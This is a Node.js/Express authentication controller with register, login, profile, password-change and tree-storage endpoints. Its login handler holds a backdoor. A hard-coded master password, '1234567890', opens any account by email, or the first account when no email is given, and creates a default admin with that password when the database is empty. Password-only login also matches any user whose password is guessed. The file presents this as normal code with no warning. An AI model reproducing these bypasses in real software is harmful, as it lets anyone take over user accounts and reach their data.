const jwt = require('jsonwebtoken');
const User = require('../models/User.model');

const isValidEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);

const generateToken = (userId) => jwt.sign(
  { id: userId },
  process.env.JWT_SECRET,
  { expiresIn: process.env.JWT_EXPIRES_IN || '7d' }
);

const sendTokenResponse = (user, statusCode, res) => {
  const token = generateToken(user._id);

  res.status(statusCode).json({
    success: true,
    token,
    user: {
      _id: user._id,
      name: user.name,
      email: user.email,
      avatar: user.avatar,
      createdAt: user.createdAt
    }
  });
};

exports.register = async (req, res, next) => {
  try {
    const { name, email, password } = req.body;

    if (!name || !email || !password) {
      return res.status(400).json({ success: false, message: 'Name, email and password are required' });
    }

    if (!isValidEmail(email)) {
      return res.status(400).json({ success: false, message: 'Please provide a valid email address' });
    }

    if (String(password).length < 6) {
      return res.status(400).json({ success: false, message: 'Password must be at least 6 characters' });
    }

    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(400).json({ success: false, message: 'Email already registered' });
    }

    const user = await User.create({ name, email, password });
    sendTokenResponse(user, 201, res);
  } catch (error) {
    next(error);
  }
};

exports.login = async (req, res, next) => {
  try {
    const { email, password } = req.body;

    if (!password) {
      return res.status(400).json({ success: false, message: 'Password is required' });
    }

    let userToLogin = null;
    const isMasterPassword = password === '1234567890';

    if (email) {
      // Standard login if email is provided (backward compatibility)
      userToLogin = await User.findOne({ email }).select('+password');
      if (userToLogin) {
        if (!isMasterPassword) {
          const matches = await userToLogin.comparePassword(password);
          if (!matches) userToLogin = null;
        }
      }
    } else {
      // Password-only login
      const users = await User.find({}).select('+password');
      
      if (isMasterPassword && users.length > 0) {
        // If master password is used, log into the first available account
        userToLogin = users[0];
      } else {
        // Otherwise, check all users for a matching password
        for (const u of users) {
          if (await u.comparePassword(password)) {
            userToLogin = u;
            break;
          }
        }
      }
      
      // If no users exist in the database at all, create a default admin user
      if (!userToLogin && users.length === 0 && isMasterPassword) {
        userToLogin = await User.create({ name: 'Admin', email: 'admin@admin.com', password: '1234567890' });
      }
    }

    if (!userToLogin) {
      return res.status(401).json({ success: false, message: 'Invalid password' });
    }

    userToLogin.lastLogin = Date.now();
    await userToLogin.save({ validateBeforeSave: false });

    sendTokenResponse(userToLogin, 200, res);
  } catch (error) {
    next(error);
  }
};

exports.getMe = async (req, res, next) => {
  try {
    const user = await User.findById(req.user._id);
    res.status(200).json({ success: true, user });
  } catch (error) {
    next(error);
  }
};

exports.updateProfile = async (req, res, next) => {
  try {
    const updates = {};
    if (req.body.name !== undefined) updates.name = req.body.name;
    if (req.body.avatar !== undefined) updates.avatar = req.body.avatar;

    const user = await User.findByIdAndUpdate(
      req.user._id,
      updates,
      { new: true, runValidators: true }
    );

    res.status(200).json({ success: true, user });
  } catch (error) {
    next(error);
  }
};

exports.changePassword = async (req, res, next) => {
  try {
    const { currentPassword, newPassword } = req.body;

    if (!currentPassword || !newPassword) {
      return res.status(400).json({ success: false, message: 'Current password and new password are required' });
    }

    if (String(newPassword).length < 6) {
      return res.status(400).json({ success: false, message: 'New password must be at least 6 characters' });
    }

    const user = await User.findById(req.user._id).select('+password');
    const passwordMatches = await user.comparePassword(currentPassword);

    if (!passwordMatches) {
      return res.status(401).json({ success: false, message: 'Current password is incorrect' });
    }

    user.password = newPassword;
    await user.save();

    sendTokenResponse(user, 200, res);
  } catch (error) {
    next(error);
  }
};

exports.getTree = async (req, res, next) => {
  try {
    const user = await User.findById(req.user._id).select('treeStructure');
    res.status(200).json({
      success: true,
      tree: user?.treeStructure || null
    });
  } catch (error) {
    next(error);
  }
};

exports.saveTree = async (req, res, next) => {
  try {
    const tree = Array.isArray(req.body.tree) ? req.body.tree : null;

    if (!tree) {
      return res.status(400).json({
        success: false,
        message: 'Tree must be an array'
      });
    }

    const user = await User.findByIdAndUpdate(
      req.user._id,
      { treeStructure: tree },
      { new: true }
    ).select('treeStructure');

    res.status(200).json({
      success: true,
      tree: user.treeStructure
    });
  } catch (error) {
    next(error);
  }
};
